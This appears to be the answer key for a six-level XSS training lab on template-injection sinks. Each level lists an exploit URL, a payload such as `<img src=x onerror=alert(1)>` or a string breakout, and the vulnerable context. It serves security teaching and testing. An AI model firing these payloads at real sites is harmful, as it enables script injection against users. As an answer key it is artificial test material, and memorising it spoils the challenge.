# tplinject — solutions

Template-injection-style XSS through JS template literals, `<template>` cloning, `script type=text/template`, double-render, and data-attribute → innerHTML pipes.

### tplinject-level1

`/tplinject/level1/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside `\`Hello ${"..."}\`` — close JS double-quoted string, run

### tplinject-level2

`/tplinject/level2/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `<template>` innerHTML assigned to live div — img onerror fires

### tplinject-level3

`/tplinject/level3/?query=%3C/script%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: inside JS single-quoted then innerHTML — close script wins

### tplinject-level4

`/tplinject/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: inside `<script type=text/template>` (inert) then innerHTML

### tplinject-level5

`/tplinject/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: server-side double-render substitution; raw HTML body sink

### tplinject-level6

`/tplinject/level6/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: lands in data-user attr; JS reads attr then innerHTML — html executes via sink
